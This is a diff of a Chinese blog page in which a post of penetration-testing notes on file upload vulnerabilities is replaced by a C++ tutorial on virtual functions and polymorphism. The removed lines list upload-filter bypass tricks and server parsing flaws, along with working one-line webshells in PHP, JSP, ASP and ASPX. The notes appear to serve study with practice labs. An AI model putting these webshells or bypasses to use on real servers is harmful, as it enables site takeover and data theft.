@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>文件上传综述 |  小张之栈</title>
+      <title>C++知识点 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-文件上传综述"
+  id="post-C"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -75,7 +75,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  文件上传综述
+  C++知识点
 </h1>
  
 
@@ -83,11 +83,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%BC%E8%BF%B0/" class="article-date">
-  <time datetime="2023-05-20T02:11:37.000Z" itemprop="datePublished">2023-05-20</time>
+      <a href="/2023/08/03/C/" class="article-date">
+  <time datetime="2023-08-02T16:21:20.000Z" itemprop="datePublished">2023-08-03</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/">web漏洞</a> / <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+    <a class="article-category-link" href="/categories/C-%E7%9F%A5%E8%AF%86%E7%82%B9/">C++知识点</a>
   </div>
   
 <div class="word_count">
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.4k</span>
+            <span class="post-count">785</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">5 分钟</span>
+            <span class="post-count">3 分钟</span>
         </span>
     </span>
 </div>
@@ -119,90 +119,39 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>文件上传<br>    初识<br>        意义<br>        危害<br>        查找&#x2F;判断方式<br>        注意点<br>        实际应用说明<br>    验证&#x2F;绕过<br>        前端<br>            JS类防护<br>        后端<br>            黑名单<br>                特殊解析后缀<br>                .htaccess解析<br>                大小写绕过<br>                点绕过<br>                空格绕过<br>                ::$$DATA绕过<br>                配合解析漏洞<br>                双后缀名绕过<br>            白名单<br>                MIME绕过<br>                %00截断：在url中%00表示ascii码的0，表示字符串结束。（php版本&lt;5.3.4吧）<br>                0x00截断<br>                0x0a截断<br>            内容及其他<br>                文件头检测<br>                二次渲染<br>                条件竞争<br>                突破getimagesize<br>                突破exif_imagetype<br>    漏洞&#x2F;修复<br>        解析漏洞<br>            IIS6&#x2F;7.X<br>            Apache<br>            Nginx<br>        CMS漏洞<br>            子主题 1<br>            子主题 2<br>            子主题 3<br>        其他漏洞<br>            编辑器漏洞<br>                fackeditor<br>                ewebeditor<br>                ckeditor<br>                kindedit<br>                …<br>            CVE漏洞<br>            安全修复<br>    WAF绕过<br>        safadog<br>        BT<br>        XXX云盾</p>
-<p><strong>利用思路</strong></p>
-<p>常规类</p>
-<p>​	扫描获取上传</p>
-<p>​	会员中心上传</p>
-<p>​	后台系统上传</p>
-<p>​	各种途径上传</p>
-<p>CMS类</p>
-<p>​	CMS源码</p>
-<p>编辑器类</p>
-<p>​	ckeditor</p>
-<p>​    ewebeditor<br>​			ckeditor<br>​			kindedit</p>
-<p>其他&#x2F;CVE</p>
-<p>​	平台审计</p>
-<p>​	第三方</p>
-<h2 id="1-基础与过滤方式"><a href="#1-基础与过滤方式" class="headerlink" title="1.基础与过滤方式"></a>1.基础与过滤方式</h2><p>是什么：程序对文件的上传没有全面的限制，导致用户可以上传一些超越用户权限的一些文件，如木马,shell脚本,病毒等。</p>
-<p>文件上传利用前提:1.能上传上去；2.文件能被解析；3.知道绝对<strong>路径</strong>且能访问 </p>
-<p>危害：获取到网站权限，进而获取数据。即通过该漏洞上传webshell后门。</p>
-<p>查找&#x2F;判断：1.目录扫描找到上传地址</p>
-<p>​					2.会员中心</p>
-<p>​					3.后台</p>
-<p>​					4.白盒：拿到源代码找漏洞</p>
-<p>注意点：拿到漏洞，要对漏洞类型进行区分</p>
-<p>实际应用说明：上传后门脚本获取网站权限</p>
-<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><ul>
-<li>常规文件上传地址的获取说明	：工具扫描</li>
-<li>不同格式下的文件类型后门测试：这个要结合自己的木马类型，如果是php，你连接地址为..&#x2F;1.jpg，显示是不符合的。(.htacess另说)</li>
-<li>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞</li>
-<li>upload-labs</li>
-<li>CMS&#x2F;CVE上传漏洞复现</li>
-</ul>
-<h2 id="2-后端黑名单绕过"><a href="#2-后端黑名单绕过" class="headerlink" title="2.后端黑名单绕过"></a>2.后端黑名单绕过</h2><p>文件上传常见验证方式：</p>
-<p>后缀名：黑名单(明确不让上传的格式后缀)、白名单(允许可上传的格式后缀，相对来说安全性高点)</p>
-<p>文件类型：MIME信息(Content-type的值)</p>
-<p>文件头：内容头信息，如gif的文件头是GIF89a</p>
-<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h4><p>upload-labs:<strong>Pass 1-12</strong></p>
-<p>简要上传表单代码分析解释 </p>
-<blockquote>
-<p>$_FILES[表单中参数名][文件自带属性如(name&#x2F;type&#x2F;size)]</p>
-<p>$_FILES[‘myfile’][‘name’]</p>
-<p>$_FILES[‘myfile’][‘size’]</p>
-<p>$_FILES[‘myfile’][‘type’]</p>
-</blockquote>
-<blockquote>
-<p>&lt;form …&gt;<br>    &lt;input class&#x3D;”input_file” type&#x3D;”file” name&#x3D;”myfile”&#x2F;&gt;<br>    …<br>&lt;&#x2F;form&gt;</p>
-</blockquote>
-<h2 id="3-内容逻辑数组绕过"><a href="#3-内容逻辑数组绕过" class="headerlink" title="3.内容逻辑数组绕过"></a>3.内容逻辑数组绕过</h2><h4 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h4><ul>
-<li>upload-labs:<strong>Pass 13-20</strong></li>
-<li>CVE-2017-12615-上传-Tomcat</li>
-<li>中间件解析漏洞+配合文件上传测试<ul>
-<li>IIS-上传-解析-(panfei806)</li>
-<li>Apache-上传-解析-vulhub</li>
-<li>Nginx-上传-解析-vulhub</li>
-</ul>
-</li>
-</ul>
-<h4 id="中间件解析漏洞："><a href="#中间件解析漏洞：" class="headerlink" title="中间件解析漏洞："></a>中间件解析漏洞：</h4><p>解析漏洞</p>
-<h5 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h5><p>​		xxx.jpg%00.php(Nginx&lt;8.03 空字节代码执行漏洞，前提关闭了fast-cgi)<br>​		fix_pathinfo<br>​			&#x2F;1.jpg&#x2F;1.php<br>​			&#x2F;1.jpg%00.php &#x2F;&#x2F;相当于上传的图片码，但可以通过这个操作去执行图片的php代码<br>​			&#x2F;1.jpg&#x2F;%20\0.php &#x2F;&#x2F;文件名逻辑漏洞（让图片作为php文件解析）</p>
-<h5 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h5><p>​		IIS5.x-IIS6.x<br>​			&#x2F;xx.asp&#x2F;xx.jpg  &#x2F;&#x2F;将.asp目录下的文件解析成asp文件<br>​			xx.asp;jpg  &#x2F;&#x2F;服务器默认不解析分号后面的后缀，所以可以实现后缀绕过<br>​			test.asa test.cer test.cdx<br>​		IIS7.5</p>
-<p>前提是fast-cgi开启：&#x2F;&#x2F; 123.***&#x2F;.php 加了后面的&#x2F;.php访问的话，默认将123.***识别为php文件执行。</p>
-<p>如果shell语句为：</p>
-<p><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; </code></p>
-<p>如果能上传一个图片马，记为test.jpg，访问test.jpg&#x2F;**.php，当前目录下会生成一句话木马shell.php</p>
-<p>​			a.aspx.a;a.aspx.jog.jpg </p>
-<h5 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h5><p>​		test.php.php123  从右到左开始判断解析<br>​		AddHandler php5-script.php     test2.php.jpg<br>​		AddType application&#x2F;x-httpd-php .jpg     即使扩展名是jpg,一样能以php方式执行</p>
-<h2 id="windows特性绕过"><a href="#windows特性绕过" class="headerlink" title="windows特性绕过"></a>windows特性绕过</h2><p>黑名单，但是没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p>
-<p>大小写不区分,test.txt与Test.txt一样</p>
-<p><strong>以下均为同一个文件：</strong></p>
-<blockquote>
-<p>“test.asp”<br>“Test.asp”<br>“TEST.ASP”<br>“test.asp.”<br>“test.asp “<br>“TEST.asp …”<br>“test.asp:1.jpg..”<br>“Test.asp ..   … “<br>“test.asp .. .�”    （乱码字符是ascii值为 0xC8 的不可打印字符）<br>————————————————<br>版权声明：本文为CSDN博主「三体-二向箔」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39157582/article/details/108282573">https://blog.csdn.net/weixin_39157582/article/details/108282573</a></p>
-</blockquote>
-<p>如调用系统函数建立“test.:jpg”文件，因为“:”截断，实质上会生成“test.”文件，又因为Windows系统会吃掉“.”，所以，右键删除，识别不了该文件。尝试删除掉，会文件异常。</p>
-<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="jsp版"><a href="#jsp版" class="headerlink" title="jsp版"></a>jsp版</h3><p>相关函数</p>
-<ol>
-<li>java.lang.Runtime.exec()</li>
-<li>java.lang.ProcessBuilder.start()</li>
-</ol>
-<p><code>&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></p>
-<p><code>类似于&lt;?PHP eval($GET_[&#39;i&#39;]);?&gt;</code></p>
-<p>但是 jsp 一句话没有回显，无法看到返回的信息，通常用来反弹 shell</p>
-<h2 id="asp版"><a href="#asp版" class="headerlink" title="asp版"></a>asp版</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;MH&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;MH&quot;)%&gt;</span><br><span class="line">&lt;%execute(request(&quot;MH&quot;))%&gt;</span><br><span class="line">&lt;%If Request(&quot;MH&quot;)&lt;&gt;&quot;&quot; Then Execute(Request(&quot;MH&quot;))%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;MH&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+  <h1 id="1-虚函数"><a href="#1-虚函数" class="headerlink" title="1.虚函数"></a>1.虚函数</h1><p><code>virtual 类型 成员函数名 (参数表);</code></p>
+<p>虚函数必须存在于类的继承环境中才有意义</p>
+<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>不同<strong>对象</strong>调用相同的<strong>函数</strong>，但呈现多样的<strong>结果</strong></p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="编译时多态"><a href="#编译时多态" class="headerlink" title="编译时多态"></a>编译时多态</h4><p>编译过程中静态确定同名操作与具体对象绑定的关系（函数重载、运算符重载、模板）</p>
+<p>优点：程序运行时函数调用速度快、效率高</p>
+<p>缺点：编程不灵活</p>
+<h4 id="运行时多态"><a href="#运行时多态" class="headerlink" title="运行时多态"></a>运行时多态</h4><p>动态确定同名操作与具体对象绑定的关系（继承和虚函数）</p>
+<p>优点：编程更加灵活、系统易于扩展</p>
+<p>缺点：调用速度比静态绑定的函数慢</p>
+<p><strong>条件：</strong></p>
+<p><code>1.有虚函数；</code></p>
+<p><code>			2.符合赋值兼容规则；</code></p>
+<p><code>3.由指针或引用去调用虚函数</code></p>
+<h5 id="如果不用虚函数"><a href="#如果不用虚函数" class="headerlink" title="如果不用虚函数"></a>如果不用虚函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">class test1&#123;</span><br><span class="line">protected:</span><br><span class="line">    int b;</span><br><span class="line">public:</span><br><span class="line">    test1(int v):b(v) &#123;&#125;</span><br><span class="line">  //  virtual void eat()=0;</span><br><span class="line">    void eat()&#123;</span><br><span class="line">        cout&lt;&lt;&quot;test1&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class him:public test1&#123;</span><br><span class="line">public:</span><br><span class="line">    him():test1(0)&#123;&#125;</span><br><span class="line">    // virtual void eat() override&#123;</span><br><span class="line">    //     cout&lt;&lt;&quot;him,&quot;&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    void eat() &#123;</span><br><span class="line">        cout&lt;&lt;&quot;him,&quot;&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class you:public test1&#123;</span><br><span class="line">private:</span><br><span class="line">    int c;</span><br><span class="line">public:</span><br><span class="line">    you():test1(1),c(2)&#123;&#125;</span><br><span class="line">    // virtual void eat() override&#123;</span><br><span class="line">    //     cout&lt;&lt;&quot;you,&quot;&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    void eat() &#123;</span><br><span class="line">        cout&lt;&lt;&quot;you,&quot;&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    you* pyou=new you();</span><br><span class="line">    him* phim=new him();</span><br><span class="line"></span><br><span class="line">	//基类的指针指向派生类的对象</span><br><span class="line">    test1* eater1=(test1*)pyou;</span><br><span class="line">    test1* eater2=(test1*)phim;</span><br><span class="line"></span><br><span class="line">    eater2-&gt;eat();</span><br><span class="line">    eater1-&gt;eat();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>test1<br>test1</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">using namespace std;</span><br><span class="line">class test1&#123;</span><br><span class="line">protected:</span><br><span class="line">    int b;</span><br><span class="line">public:</span><br><span class="line">    test1(int v):b(v) &#123;&#125;</span><br><span class="line">    virtual void eat()=0;</span><br><span class="line">&#125;;</span><br><span class="line">class him:public test1&#123;</span><br><span class="line">public:</span><br><span class="line">    him():test1(0)&#123;&#125;</span><br><span class="line">    virtual void eat() override&#123;</span><br><span class="line">        cout&lt;&lt;&quot;him,&quot;&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class you:public test1&#123;</span><br><span class="line">private:</span><br><span class="line">    int c;</span><br><span class="line">public:</span><br><span class="line">    you():test1(1),c(2)&#123;&#125;</span><br><span class="line">    virtual void eat() override&#123;</span><br><span class="line">        cout&lt;&lt;&quot;you,&quot;&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    you* pyou=new you();</span><br><span class="line">    him* phim=new him();</span><br><span class="line">	</span><br><span class="line">	//基类的指针指向派生类的对象</span><br><span class="line">    test1* eater1=(test1*)pyou;</span><br><span class="line">    test1* eater2=(test1*)phim;</span><br><span class="line">	</span><br><span class="line">	//相同结果</span><br><span class="line">	 // you pyou;</span><br><span class="line">    // him phim;</span><br><span class="line"></span><br><span class="line">    // test1* eater1= &amp;pyou;</span><br><span class="line">    // test1* eater2= &amp;phim;</span><br><span class="line">	</span><br><span class="line">    eater2-&gt;eat();// 调用 him 类的 eat() 函数</span><br><span class="line">    eater1-&gt;eat();//// 调用 you 类的 eat() 函数</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>him,0<br>you,2</p>
+</blockquote>
+<p><code>有了虚函数</code>，<strong>指定哪个对象，就调用哪个函数的方法</strong></p>
+<p>类-&gt;内存对象-&gt;虚函数表</p>
+<h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>指在delete对象指针的时候，调用的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Base *bp;</span><br><span class="line"></span><br><span class="line">bp=new derived();//Base的派生</span><br><span class="line"></span><br><span class="line">delete bp;</span><br></pre></td></tr></table></figure>
+
+<p>如果基类没有加virtual，delete时只返回基类的析构</p>
+<p>如果基类加了virtual，派生的析构可不加，delete时返回基类+派生的析构</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>而且基类一般不需要实现virtual 函数，它只为派生提供一个接口，只用提供函数名，而不实现函数体，即为<strong>纯虚函数</strong> ：<code>virtual void eat()=0;</code>(声明语句，而不能被调用)</p>
+<p>有<strong>纯虚函数</strong>的类叫做<strong>抽象类</strong>，不能实例化一个抽象类的对象，所以会报错，因为没有具体的功能实现</p>
+<p>如果其派生类也不实现同名函数的话（比如，直接不写eat()函数）也会报错的。</p>
  
       <!-- reward -->
       
@@ -267,12 +216,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%BC%E8%BF%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/08/03/C/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C-%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">C++知识点</a></li></ul>
 
     </footer>
   </div>
@@ -280,19 +229,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/05/20/python%E4%B8%8E%E6%B8%97%E9%80%8F/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            python与渗透
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/" class="article-nav-link">
+      <a href="/2023/07/04/%E5%9B%9E%E5%BD%92%E8%AF%BE%E6%9C%AC/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">Web源码拓展</div>
+        <div class="article-nav-title">回归课本</div>
       </a>
     
   </nav>
